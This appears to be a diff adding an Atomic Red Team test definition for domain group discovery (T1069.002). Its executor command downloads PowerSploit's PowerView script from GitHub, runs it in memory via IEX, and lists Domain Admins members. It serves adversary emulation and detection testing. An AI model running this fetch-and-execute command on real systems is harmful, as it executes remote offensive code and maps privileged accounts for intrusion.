@@ -1,0 +1,23 @@
+{
+    "name": "Get-DomainGroupMember with PowerView",
+    "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1069.002",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "Domain Groups",
+    "source": "ART",
+    "uuid": "46352f40-f283-4fe5-b56d-d9a71750e145",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
